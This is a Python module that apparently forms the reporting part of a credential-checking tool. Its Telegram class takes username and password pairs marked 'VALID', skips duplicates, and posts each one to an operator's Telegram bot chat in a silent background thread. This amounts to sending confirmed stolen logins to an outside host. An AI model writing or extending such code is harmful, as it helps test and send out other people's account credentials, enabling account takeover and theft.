"""Configurable Telegram pusher."""
from __future__ import annotations
import threading
import urllib.parse
import urllib.request


class Telegram:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self._sent: set[str] = set()
        self._lock = threading.Lock()

    def push_valid(self, user: str, pw: str, info_line: str = "") -> None:
        key = f"{user}:{pw}"
        with self._lock:
            if key in self._sent: return
            self._sent.add(key)
        text = f"VALID\n{key}"
        if info_line: text += f"\n{info_line}"
        threading.Thread(target=self._send, args=(text,), daemon=True).start()

    def _send(self, text: str) -> None:
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        body = urllib.parse.urlencode({
            "chat_id": self.chat_id, "text": text,
            "disable_web_page_preview": "true",
        }).encode("utf-8")
        try:
            req = urllib.request.Request(url, data=body, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=15) as resp:
                resp.read()
        except Exception:
            pass